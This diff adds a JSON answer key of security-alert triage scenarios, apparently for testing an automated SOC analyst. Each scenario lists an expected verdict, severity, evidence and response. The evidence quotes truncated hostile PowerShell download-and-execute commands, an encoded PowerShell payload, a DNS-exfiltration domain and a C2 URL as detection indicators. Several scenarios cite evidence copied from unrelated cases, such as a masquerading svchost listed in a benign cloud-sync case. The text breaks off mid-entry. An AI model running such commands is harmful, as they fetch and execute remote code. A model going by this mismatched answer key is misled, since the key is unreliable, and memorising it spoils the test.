@@ -1,0 +1,505 @@
+[
+  {
+    "scenario": "Benign - Windows Update",
+    "expected_verdict": "Benign True Positive",
+    "expected_severity_range": [
+      "Informational"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Workstation-Sales21 (CI00078) at 192.168.1.101 is Production with Medium criticality; function: Standard workstation for a sales associate.",
+      "Vulnerability VULN-1005 (Microsoft Office and Windows HTML RCE Vulnerability) on Workstation-Sales21 severity High status Open.",
+      "DNS query from Workstation-Sales21 to hotmail.com (NOERROR).",
+      "Network VLAN 10 (VLAN-Workstations-MainOffice): Allowed outbound internet access via proxy. Allowed access to Server Farm on ports 443, 1433, 8080. Allowed access to File Servers on port 445. RDP/SSH from this VLAN to servers is forbidden.",
+      "Service policy POL-008 marks TCP/443 as Allowed: Standard secure web browsing and API calls. All outbound HTTPS goes through the web proxy. Inbound HTTPS is allowed to the DMZ."
+    ],
+    "expected_course_of_action": "No action required. This is expected and legitimate traffic. Correlate with the corporate patching schedule if further verification is needed. Whitelist the source if it generates frequent, unnecessary alerts."
+  },
+  {
+    "scenario": "Malicious - Malware Command & Control (C2) Communication",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Critical"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-001 flags 91.218.114.21 as Qakbot C2 Server (confidence High).",
+      "CMDB asset Workstation-Finance03 (CI00015) at 10.0.5.23 is Production with High criticality; function: Standard workstation for a financial controller.",
+      "EDR event EDR-EVT-9005 FileWrite by OUTLOOK.EXE user p.davis at 2025-11-01T09:55:20Z",
+      "EDR event EDR-EVT-9006 ProcessCreate by powershell.exe cmd powershell -exec bypass -enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB... user p.davis at 2025-11-01T09:55:21Z",
+      "DNS query from Workstation-Finance03 to qakbot-c2-panel-ru.net (NOERROR).",
+      "Web proxy CONNECT to https://91.218.114.21:8081/gate.php by p.davis action Blocked.",
+      "Network VLAN 120 (VLAN-ServerFarm-Production): Strictly controlled. No general outbound internet access. Allowed outbound connections only to specific, whitelisted external APIs (e.g., Salesforce, Microsoft Update). Should never initiate connections to workstation VLANs."
+    ],
+    "expected_course_of_action": "Immediate action required. Isolate the host from the network to prevent lateral movement and further damage. Initiate incident response procedures and begin forensic analysis of the compromised device.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Suspicious - External Port Scan",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-008 flags 198.51.100.5 as General Purpose Scanner (confidence Medium).",
+      "CMDB asset WebServer-Public01 (CI00101) at 203.0.113.10 is Production with Medium criticality; function: Public-facing corporate marketing website.",
+      "Vulnerability VULN-1001 (Apache Log4j Remote Code Execution (Log4Shell)) on WebServer-Public01 severity Critical status Mitigated.",
+      "Vulnerability VULN-1002 (Spring Framework RCE (Spring4Shell)) on WebServer-Public01 severity Critical status Patched.",
+      "Network VLAN 200 (VLAN-DMZ): Inbound internet traffic is allowed only on TCP/80 and TCP/443. Traffic from the DMZ initiating connections to the internal network is STRICTLY FORBIDDEN, especially on management ports like RDP/SSH or file sharing ports like SMB."
+    ],
+    "expected_course_of_action": "Block the source IP address at the network edge firewall. Review firewall rules for the target server to ensure only necessary ports are exposed. Monitor for further activity from this source or related IP blocks.",
+    "expected_playbook_id": "PB-RECON-001"
+  },
+  {
+    "scenario": "Benign - Cloud Storage Sync",
+    "expected_verdict": "Benign True Positive",
+    "expected_severity_range": [
+      "Informational"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Laptop-Marketing01 (CI00071) at 192.168.1.150 is Production with Medium criticality; function: Standard user laptop for a marketing specialist.",
+      "EDR event EDR-EVT-9007 ProcessCreate by svchost.exe cmd C:\\Users\\Public\\svchost.exe -k netsvcs... user m.jones at 2025-11-02T08:12:44Z",
+      "EDR event EDR-EVT-9008 ProcessCreate by svchost.exe cmd C:\\Windows\\System32\\svchost.exe -k DcomLaunch... user SYSTEM at 2025-11-02T08:12:40Z",
+      "Web proxy POST to https://content.dropboxapi.com/2/files/upload by m.jones action Allowed.",
+      "Web proxy GET to https://www.linkedin.com/feed/ by m.jones action Allowed.",
+      "Network VLAN 10 (VLAN-Workstations-MainOffice): Allowed outbound internet access via proxy. Allowed access to Server Farm on ports 443, 1433, 8080. Allowed access to File Servers on port 445. RDP/SSH from this VLAN to servers is forbidden.",
+      "Service policy POL-008 marks TCP/443 as Allowed: Standard secure web browsing and API calls. All outbound HTTPS goes through the web proxy. Inbound HTTPS is allowed to the DMZ."
+    ],
+    "expected_course_of_action": "No action required. Verify that Dropbox is an approved cloud service provider. Monitor for unusually large uploads which could indicate unsanctioned data exfiltration."
+  },
+  {
+    "scenario": "Malicious - Data Exfiltration via DNS Tunneling",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Critical"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-002 flags 104.244.42.1 as DNSExfiltrator-Endpoint (confidence High).",
+      "CMDB asset Server-DevDB01 (CI00033) at 10.0.15.45 is Development with Low criticality; function: MySQL database server for the staging and development environment.",
+      "Vulnerability VULN-1003 (MySQL Invalid Authentication Packet Vulnerability) on Server-DevDB01 severity High status Open.",
+      "Vulnerability VULN-1004 (OpenSSL Padding Oracle Vulnerability (Lucky 13)) on Server-DevDB01 severity Medium status Open.",
+      "DNS query from Server-DevDB01 to google.com (NOERROR).",
+      "DNS query from Server-DevDB01 to wMWEwOWY2NzI2NDY1MmU2MzYxNzM2ODJlN.data.malicious-exfil.net (NOERROR).",
+      "Web proxy CONNECT to https://89.234.157.254:9001 by None action Blocked.",
+      "Network VLAN 50 (VLAN-Development): Permissive outbound internet access. Intra-VLAN traffic is unrestricted to allow for testing. Access to Production Server VLANs is strictly forbidden, except for read-only access to specific database replicas."
+    ],
+    "expected_course_of_action": "Immediate action required. Isolate the host from the network. Block the destination domain/IP at the DNS server or firewall. Analyze DNS logs to determine the extent of the exfiltration and initiate incident response.",
+    "expected_playbook_id": "PB-EXFIL-001"
+  },
+  {
+    "scenario": "Benign - Remote Employee VPN Access",
+    "expected_verdict": "Benign True Positive",
+    "expected_severity_range": [
+      "Low"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset VPN-Concentrator-HQ (CI00103) at 203.0.113.50 is Production with High criticality; function: SSL VPN endpoint for remote corporate access.",
+      "Network VLAN 300 (VLAN-VPN-Users): Once authenticated, users are treated as if they are on a restricted version of the Main Office VLAN. Access is explicitly defined by rules on the VPN concentrator and internal firewall.",
+      "Service policy POL-012 marks UDP/1194 as Allowed: Primary protocol for remote user VPN access."
+    ],
+    "expected_course_of_action": "Verify the user's identity and travel schedule with their manager or HR. If the user's activity is expected, document the event and close the alert. If suspicious, enforce multi-factor authentication and temporarily suspend the account."
+  },
+  {
+    "scenario": "Malicious - Phishing Link Clicked",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-010 flags 172.67.186.130 as Cloudflare Proxy (confidence Informational).",
+      "CMDB asset Laptop-HR05 (CI00092) at 192.168.2.55 is Production with High criticality; function: Laptop for an HR Business Partner. Contains PII.",
+      "EDR event EDR-EVT-9001 ProcessCreate by powershell.exe cmd powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring... user s.adams at 2025-10-26T11:14:08Z",
+      "EDR event EDR-EVT-9002 NetworkConnection by powershell.exe user s.adams at 2025-10-26T11:14:09Z",
+      "DNS query from Laptop-HR05 to secure-microsft-login.com (NOERROR).",
+      "Web proxy GET to http://secure-microsft-login.com/owa/auth/logon.aspx?url=...&reason=2 by s.adams action Allowed.",
+      "Network VLAN 15 (VLAN-Workstations-HR): Same as Main Office, but with stricter data loss prevention (DLP) rules on outbound traffic. Internet access is limited to whitelisted domains.",
+      "Service policy POL-005 marks TCP/80 as Allowed: Standard web browsing. All outbound HTTP traffic must go through the corporate web proxy. All inbound HTTP to the DMZ is redirected to HTTPS."
+    ],
+    "expected_course_of_action": "Isolate the host immediately to prevent malware execution or credential submission. Reset the user's password. Scan the device for malware. Block the destination domain across the enterprise.",
+    "expected_playbook_id": "PB-PHISH-001"
+  },
+  {
+    "scenario": "Suspicious - Internal Port Scan (Lateral Movement)",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Server-DevDB01 (CI00033) at 10.0.15.45 is Development with Low criticality; function: MySQL database server for the staging and development environment.",
+      "Vulnerability VULN-1003 (MySQL Invalid Authentication Packet Vulnerability) on Server-DevDB01 severity High status Open.",
+      "Vulnerability VULN-1004 (OpenSSL Padding Oracle Vulnerability (Lucky 13)) on Server-DevDB01 severity Medium status Open.",
+      "DNS query from Server-DevDB01 to google.com (NOERROR).",
+      "DNS query from Server-DevDB01 to wMWEwOWY2NzI2NDY1MmU2MzYxNzM2ODJlN.data.malicious-exfil.net (NOERROR).",
+      "Web proxy CONNECT to https://89.234.157.254:9001 by None action Blocked.",
+      "CMDB asset Workstation-Finance03 (CI00015) at 10.0.5.23 is Production with High criticality; function: Standard workstation for a financial controller.",
+      "EDR event EDR-EVT-9005 FileWrite by OUTLOOK.EXE user p.davis at 2025-11-01T09:55:20Z"
+    ],
+    "expected_course_of_action": "Investigate the source host immediately as it may be compromised. Isolate the source host and perform a forensic analysis. Review access logs on the destination server for any successful connections.",
+    "expected_playbook_id": "PB-RECON-001"
+  },
+  {
+    "scenario": "Benign - API Call to SaaS Platform",
+    "expected_verdict": "Benign True Positive",
+    "expected_severity_range": [
+      "Informational"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset AppServer-CRM01 (CI00018) at 10.0.5.80 is Production with High criticality; function: Application server hosting the internal CRM platform. Connects to Salesforce API.",
+      "Vulnerability VULN-1006 (VMware Tools Privilege Escalation Vulnerability) on AppServer-CRM01 severity High status Open.",
+      "EDR event EDR-EVT-9011 NetworkConnection by mstsc.exe user j.smith at 2025-11-04T10:10:11Z",
+      "DNS query from AppServer-CRM01 to api.salesforce.com (NOERROR).",
+      "Web proxy POST to https://api.salesforce.com/services/data/v56.0/sobjects/Account/ by sql_service action Allowed.",
+      "Network VLAN 120 (VLAN-ServerFarm-Production): Strictly controlled. No general outbound internet access. Allowed outbound connections only to specific, whitelisted external APIs (e.g., Salesforce, Microsoft Update). Should never initiate connections to workstation VLANs.",
+      "Service policy POL-008 marks TCP/443 as Allowed: Standard secure web browsing and API calls. All outbound HTTPS goes through the web proxy. Inbound HTTPS is allowed to the DMZ."
+    ],
+    "expected_course_of_action": "No action required. This is expected traffic for an application integrated with Salesforce. Monitor API call volume for anomalies that could indicate a compromised API key."
+  },
+  {
+    "scenario": "Malicious - Brute Force Login Attempt (SSH)",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-003 flags 212.192.241.114 as Persistent SSH Brute-Forcer (confidence Medium).",
+      "Network VLAN 200 (VLAN-DMZ): Inbound internet traffic is allowed only on TCP/80 and TCP/443. Traffic from the DMZ initiating connections to the internal network is STRICTLY FORBIDDEN, especially on management ports like RDP/SSH or file sharing ports like SMB.",
+      "Service policy POL-002 marks TCP/22 as Restricted: For secure remote administration of Linux/Unix servers and network devices. SFTP is the approved method for secure file transfers."
+    ],
+    "expected_course_of_action": "Block the source IP address at the firewall. Ensure that SSH access is restricted to known IPs and that password-based authentication is disabled in favor of key-based authentication. Review logs for any successful logins from the source.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Malicious - PowerShell Fileless Malware Execution",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Critical"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Laptop-HR05 (CI00092) at 192.168.2.55 is Production with High criticality; function: Laptop for an HR Business Partner. Contains PII.",
+      "EDR event EDR-EVT-9001 ProcessCreate by powershell.exe cmd powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring... user s.adams at 2025-10-26T11:14:08Z",
+      "EDR event EDR-EVT-9002 NetworkConnection by powershell.exe user s.adams at 2025-10-26T11:14:09Z",
+      "DNS query from Laptop-HR05 to secure-microsft-login.com (NOERROR).",
+      "Web proxy GET to http://secure-microsft-login.com/owa/auth/logon.aspx?url=...&reason=2 by s.adams action Allowed.",
+      "Network VLAN 15 (VLAN-Workstations-HR): Same as Main Office, but with stricter data loss prevention (DLP) rules on outbound traffic. Internet access is limited to whitelisted domains.",
+      "Service policy POL-008 marks TCP/443 as Allowed: Standard secure web browsing and API calls. All outbound HTTPS goes through the web proxy. Inbound HTTPS is allowed to the DMZ."
+    ],
+    "expected_course_of_action": "Immediately isolate the host. Kill the malicious PowerShell process. Use memory forensics to analyze the payload. Reset user credentials as the script may have harvested them. Block the destination domain.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Malicious - Unexpected Outbound SMB Traffic",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Critical"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset DomainController-Primary (CI00001) at 10.0.0.1 is Production with Critical criticality; function: Primary Domain Controller, DNS, and DHCP server for the corporate network.",
+      "Vulnerability VULN-1009 (SMB Signing Not Required) on DomainController-Primary severity Medium status Open.",
+      "EDR event EDR-EVT-9003 ProcessAccess by None user DomainAdmin at 2025-10-27T02:05:18Z",
+      "EDR event EDR-EVT-9004 FileWrite by procdump64.exe user DomainAdmin at 2025-10-27T02:05:19Z",
+      "CMDB asset WebServer-Public01 (CI00101) at 203.0.113.10 is Production with Medium criticality; function: Public-facing corporate marketing website.",
+      "Vulnerability VULN-1001 (Apache Log4j Remote Code Execution (Log4Shell)) on WebServer-Public01 severity Critical status Mitigated.",
+      "Vulnerability VULN-1002 (Spring Framework RCE (Spring4Shell)) on WebServer-Public01 severity Critical status Patched.",
+      "Network VLAN 200 (VLAN-DMZ): Inbound internet traffic is allowed only on TCP/80 and TCP/443. Traffic from the DMZ initiating connections to the internal network is STRICTLY FORBIDDEN, especially on management ports like RDP/SSH or file sharing ports like SMB."
+    ],
+    "expected_course_of_action": "Isolate the web server immediately. Block all SMB traffic originating from the DMZ. Investigate the web server for signs of compromise (webshells, vulnerable plugins). Analyze domain controller logs for related suspicious access attempts.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Malicious - Credential Dumping from LSASS",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Critical"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset DomainController-Primary (CI00001) at 10.0.0.1 is Production with Critical criticality; function: Primary Domain Controller, DNS, and DHCP server for the corporate network.",
+      "Vulnerability VULN-1009 (SMB Signing Not Required) on DomainController-Primary severity Medium status Open.",
+      "EDR event EDR-EVT-9003 ProcessAccess by None user DomainAdmin at 2025-10-27T02:05:18Z",
+      "EDR event EDR-EVT-9004 FileWrite by procdump64.exe user DomainAdmin at 2025-10-27T02:05:19Z"
+    ],
+    "expected_course_of_action": "Assume widespread credential compromise. Initiate enterprise-wide password reset for all users and services. Isolate the domain controller and perform forensic analysis. Hunt for other compromised systems using the attacker's tools.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Suspicious - 'Impossible Travel' VPN Login",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset VPN-Concentrator-HQ (CI00103) at 203.0.113.50 is Production with High criticality; function: SSL VPN endpoint for remote corporate access.",
+      "IAM user j.doe (John Doe, Operations) role Project Manager status Active.",
+      "UEBA profile UEBA-USER-j.doe risk score 15; baseline {'typical_logon_hours': ['08:00-18:00 UTC'], 'common_source_countries': ['United Kingdom'], 'common_source_ips': ['192.168.1.0/24', '203.0.113.50'], 'frequently_accessed_servers': ['10.0.50.10', '10.0.5.80'], 'normal_data_egress_volume_mb_per_day': 50, 'privileged_account_use': 'Never'}."
+    ],
+    "expected_course_of_action": "Immediately suspend the user account and terminate all active sessions. Contact the user through a trusted channel (e.g., phone call) to verify their activity. Enforce multi-factor authentication if not already in place.",
+    "expected_playbook_id": "PB-PHISH-001"
+  },
+  {
+    "scenario": "Malicious - Traffic to TOR Exit Node",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-004 flags 89.234.157.254 as TOR Exit Node (confidence High).",
+      "CMDB asset Server-DevDB01 (CI00033) at 10.0.15.45 is Development with Low criticality; function: MySQL database server for the staging and development environment.",
+      "Vulnerability VULN-1003 (MySQL Invalid Authentication Packet Vulnerability) on Server-DevDB01 severity High status Open.",
+      "Vulnerability VULN-1004 (OpenSSL Padding Oracle Vulnerability (Lucky 13)) on Server-DevDB01 severity Medium status Open.",
+      "DNS query from Server-DevDB01 to google.com (NOERROR).",
+      "DNS query from Server-DevDB01 to wMWEwOWY2NzI2NDY1MmU2MzYxNzM2ODJlN.data.malicious-exfil.net (NOERROR).",
+      "Web proxy CONNECT to https://89.234.157.254:9001 by None action Blocked.",
+      "Network VLAN 50 (VLAN-Development): Permissive outbound internet access. Intra-VLAN traffic is unrestricted to allow for testing. Access to Production Server VLANs is strictly forbidden, except for read-only access to specific database replicas."
+    ],
+    "expected_course_of_action": "Isolate the host. Block all traffic to and from the Tor network at the firewall. Investigate the server for compromise and identify the process that initiated the connection.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Malicious - SQL Injection Attempt",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset WebServer-Public01 (CI00101) at 203.0.113.10 is Production with Medium criticality; function: Public-facing corporate marketing website.",
+      "Vulnerability VULN-1001 (Apache Log4j Remote Code Execution (Log4Shell)) on WebServer-Public01 severity Critical status Mitigated.",
+      "Vulnerability VULN-1002 (Spring Framework RCE (Spring4Shell)) on WebServer-Public01 severity Critical status Patched.",
+      "Threat intel indicator IOC-IP-005 flags 45.146.165.48 as Web Attack Scanner (confidence High).",
+      "Network VLAN 200 (VLAN-DMZ): Inbound internet traffic is allowed only on TCP/80 and TCP/443. Traffic from the DMZ initiating connections to the internal network is STRICTLY FORBIDDEN, especially on management ports like RDP/SSH or file sharing ports like SMB.",
+      "Service policy POL-008 marks TCP/443 as Allowed: Standard secure web browsing and API calls. All outbound HTTPS goes through the web proxy. Inbound HTTPS is allowed to the DMZ."
+    ],
+    "expected_course_of_action": "Block the source IP address. While the WAF blocked this attempt, the web application should be reviewed for SQL injection vulnerabilities by the development team. Analyze other logs from the source for further attack attempts.",
+    "expected_playbook_id": "PB-RECON-001"
+  },
+  {
+    "scenario": "Malicious - Ransomware Activity Detected",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Critical"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset FileServer01 (CI00045) at 10.0.50.10 is Production with High criticality; function: Primary file server for Marketing, HR, and Finance department shares.",
+      "CMDB asset Laptop-Marketing01 (CI00071) at 192.168.1.150 is Production with Medium criticality; function: Standard user laptop for a marketing specialist.",
+      "EDR event EDR-EVT-9007 ProcessCreate by svchost.exe cmd C:\\Users\\Public\\svchost.exe -k netsvcs... user m.jones at 2025-11-02T08:12:44Z",
+      "EDR event EDR-EVT-9008 ProcessCreate by svchost.exe cmd C:\\Windows\\System32\\svchost.exe -k DcomLaunch... user SYSTEM at 2025-11-02T08:12:40Z",
+      "Web proxy POST to https://content.dropboxapi.com/2/files/upload by m.jones action Allowed.",
+      "Web proxy GET to https://www.linkedin.com/feed/ by m.jones action Allowed.",
+      "IAM user m.jones (Michael Jones, Marketing) role Digital Marketing Specialist status Active.",
+      "Network VLAN 150 (VLAN-FileServers): No internet access. Only allows inbound SMB/NFS traffic (port 445/2049) from internal workstation and server VLANs. Outbound traffic is denied by default."
+    ],
+    "expected_course_of_action": "Execute ransomware incident response plan. Isolate the file server and the source host that initiated the encryption. Disconnect backups from the network to prevent their encryption. Do NOT pay the ransom. Begin restoration from clean backups.",
+    "expected_playbook_id": "PB-RANSOM-001"
+  },
+  {
+    "scenario": "Suspicious - Successful Login after Brute Force",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset OWA-Server-HQ (CI00102) at 203.0.113.25 is Production with High criticality; function: Hosts Outlook Web Access for remote email.",
+      "Vulnerability VULN-1008 (Microsoft Exchange Server RCE Vulnerability) on OWA-Server-HQ severity High status Patched.",
+      "IAM user s.adams (Sarah Adams, Sales) role Sales Manager, EMEA status Active.",
+      "EDR event EDR-EVT-9001 ProcessCreate by powershell.exe cmd powershell.exe -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring... user s.adams at 2025-10-26T11:14:08Z",
+      "EDR event EDR-EVT-9002 NetworkConnection by powershell.exe user s.adams at 2025-10-26T11:14:09Z"
+    ],
+    "expected_course_of_action": "Immediately suspend the user account and terminate their OWA session. Reset the user's password. Block the source IP. Investigate the user's mailbox for signs of compromise, such as new forwarding rules or mass email deletion.",
+    "expected_playbook_id": "PB-PHISH-001"
+  },
+  {
+    "scenario": "Malicious - Windows Event Log Cleared",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Workstation-Finance03 (CI00015) at 10.0.5.23 is Production with High criticality; function: Standard workstation for a financial controller.",
+      "EDR event EDR-EVT-9005 FileWrite by OUTLOOK.EXE user p.davis at 2025-11-01T09:55:20Z",
+      "EDR event EDR-EVT-9006 ProcessCreate by powershell.exe cmd powershell -exec bypass -enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB... user p.davis at 2025-11-01T09:55:21Z",
+      "DNS query from Workstation-Finance03 to qakbot-c2-panel-ru.net (NOERROR).",
+      "Web proxy CONNECT to https://91.218.114.21:8081/gate.php by p.davis action Blocked.",
+      "CMDB asset Server-DevDB01 (CI00033) at 10.0.15.45 is Development with Low criticality; function: MySQL database server for the staging and development environment.",
+      "Vulnerability VULN-1003 (MySQL Invalid Authentication Packet Vulnerability) on Server-DevDB01 severity High status Open.",
+      "Vulnerability VULN-1004 (OpenSSL Padding Oracle Vulnerability (Lucky 13)) on Server-DevDB01 severity Medium status Open."
+    ],
+    "expected_course_of_action": "Investigate immediately. Correlate with administrator activity logs. If the action was not part of a planned maintenance task, assume the administrator account is compromised and the server is breached. Begin incident response.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Suspicious - New Admin Account Creation",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset DomainController-Primary (CI00001) at 10.0.0.1 is Production with Critical criticality; function: Primary Domain Controller, DNS, and DHCP server for the corporate network.",
+      "Vulnerability VULN-1009 (SMB Signing Not Required) on DomainController-Primary severity Medium status Open.",
+      "EDR event EDR-EVT-9003 ProcessAccess by None user DomainAdmin at 2025-10-27T02:05:18Z",
+      "EDR event EDR-EVT-9004 FileWrite by procdump64.exe user DomainAdmin at 2025-10-27T02:05:19Z",
+      "IAM user j.smith (James Smith, IT Infrastructure) role Sr. Systems Administrator status Active.",
+      "EDR event EDR-EVT-9011 NetworkConnection by mstsc.exe user j.smith at 2025-11-04T10:10:11Z",
+      "UEBA profile UEBA-USER-j.smith risk score 40; baseline {'typical_logon_hours': ['07:00-19:00 UTC', '22:00-03:00 UTC'], 'common_source_countries': ['United Kingdom'], 'common_source_ips': ['10.0.10.15'], 'frequently_accessed_servers': ['10.0.0.1', '10.0.5.80', '10.0.50.10', '203.0.113.50'], 'privileged_account_use': 'Frequent (Domain Admins)', 'active_directory_activity': 'Frequent creation of user accounts, infrequent creation of admin accounts (avg 1 per quarter).'}.",
+      "IAM user backup_admin (Backup Service Admin, IT Infrastructure) role Service Account status Active."
+    ],
+    "expected_course_of_action": "Immediately disable the newly created account. Investigate which administrator account created it and verify the legitimacy of the action. If unverified, assume the source administrator account is compromised and initiate password reset."
+  },
+  {
+    "scenario": "Benign - Vulnerability Scan",
+    "expected_verdict": "Benign True Positive",
+    "expected_severity_range": [
+      "Informational"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset VulnerabilityScanner (CI00025) at 10.0.10.100 is Production with Medium criticality; function: Performs weekly authenticated and unauthenticated vulnerability scans of the internal network.",
+      "Network VLAN 40 (VLAN-IT-Admin-Security): Highly restricted internet access. Allowed to initiate RDP and SSH to all internal server VLANs. Source for authorized vulnerability scans."
+    ],
+    "expected_course_of_action": "No action required. This is a scheduled security scan. Verify the source IP belongs to the vulnerability management platform. Suppress alerts from this source during the scan window."
+  },
+  {
+    "scenario": "Malicious - Phishing Attachment Spawns PowerShell",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Critical"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Workstation-Finance03 (CI00015) at 10.0.5.23 is Production with High criticality; function: Standard workstation for a financial controller.",
+      "EDR event EDR-EVT-9005 FileWrite by OUTLOOK.EXE user p.davis at 2025-11-01T09:55:20Z",
+      "EDR event EDR-EVT-9006 ProcessCreate by powershell.exe cmd powershell -exec bypass -enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB... user p.davis at 2025-11-01T09:55:21Z",
+      "DNS query from Workstation-Finance03 to qakbot-c2-panel-ru.net (NOERROR).",
+      "Web proxy CONNECT to https://91.218.114.21:8081/gate.php by p.davis action Blocked."
+    ],
+    "expected_course_of_action": "Isolate the host immediately. Delete the phishing email from the user's inbox and search for similar emails sent to other users. Reset the user's password. Analyze the PowerShell command to determine the next stage of the attack.",
+    "expected_playbook_id": "PB-PHISH-001"
+  },
+  {
+    "scenario": "Suspicious - Large ICMP Packets (Tunneling)",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Medium"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-006 flags 192.241.220.108 as Known Covert Channel Endpoint (confidence Medium).",
+      "CMDB asset AppServer-CRM01 (CI00018) at 10.0.5.80 is Production with High criticality; function: Application server hosting the internal CRM platform. Connects to Salesforce API.",
+      "Vulnerability VULN-1006 (VMware Tools Privilege Escalation Vulnerability) on AppServer-CRM01 severity High status Open.",
+      "EDR event EDR-EVT-9011 NetworkConnection by mstsc.exe user j.smith at 2025-11-04T10:10:11Z",
+      "DNS query from AppServer-CRM01 to api.salesforce.com (NOERROR).",
+      "Web proxy POST to https://api.salesforce.com/services/data/v56.0/sobjects/Account/ by sql_service action Allowed.",
+      "Network VLAN 120 (VLAN-ServerFarm-Production): Strictly controlled. No general outbound internet access. Allowed outbound connections only to specific, whitelisted external APIs (e.g., Salesforce, Microsoft Update). Should never initiate connections to workstation VLANs."
+    ],
+    "expected_course_of_action": "Perform a packet capture on the traffic to inspect the ICMP data payload for recognizable data structures. Block outbound ICMP traffic from the source host. Investigate the source host for malware that performs ICMP tunneling.",
+    "expected_playbook_id": "PB-EXFIL-001"
+  },
+  {
+    "scenario": "Malicious - Process Masquerading",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Laptop-Marketing01 (CI00071) at 192.168.1.150 is Production with Medium criticality; function: Standard user laptop for a marketing specialist.",
+      "EDR event EDR-EVT-9007 ProcessCreate by svchost.exe cmd C:\\Users\\Public\\svchost.exe -k netsvcs... user m.jones at 2025-11-02T08:12:44Z",
+      "EDR event EDR-EVT-9008 ProcessCreate by svchost.exe cmd C:\\Windows\\System32\\svchost.exe -k DcomLaunch... user SYSTEM at 2025-11-02T08:12:40Z",
+      "Web proxy POST to https://content.dropboxapi.com/2/files/upload by m.jones action Allowed.",
+      "Web proxy GET to https://www.linkedin.com/feed/ by m.jones action Allowed."
+    ],
+    "expected_course_of_action": "Isolate the host. Terminate the malicious process. Submit a hash of the executable to a malware analysis sandbox (e.g., VirusTotal). Begin forensic investigation to determine how the malware was placed on the system.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Suspicious - Unauthorized USB Device",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "Low"
+    ],
+    "key_evidence_to_find": [
+      "CMDB asset Workstation-Finance03 (CI00015) at 10.0.5.23 is Production with High criticality; function: Standard workstation for a financial controller.",
+      "EDR event EDR-EVT-9005 FileWrite by OUTLOOK.EXE user p.davis at 2025-11-01T09:55:20Z",
+      "EDR event EDR-EVT-9006 ProcessCreate by powershell.exe cmd powershell -exec bypass -enc aQBlAHgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB... user p.davis at 2025-11-01T09:55:21Z",
+      "DNS query from Workstation-Finance03 to qakbot-c2-panel-ru.net (NOERROR).",
+      "Web proxy CONNECT to https://91.218.114.21:8081/gate.php by p.davis action Blocked.",
+      "IAM user p.davis (Patricia Davis, Finance) role Financial Controller status Active."
+    ],
+    "expected_course_of_action": "If policy dictates, automatically block the device. Dispatch a security officer or IT support to the workstation to identify the device. Remind the user of the removable media policy. Scan the workstation for malware.",
+    "expected_playbook_id": "PB-MAL-001"
+  },
+  {
+    "scenario": "Malicious - Outbound FTP Data Transfer",
+    "expected_verdict": "True Positive",
+    "expected_severity_range": [
+      "High"
+    ],
+    "key_evidence_to_find": [
+      "Threat intel indicator IOC-IP-007 flags 5.101.155.200 as Malware Drop Site (confidence High).",
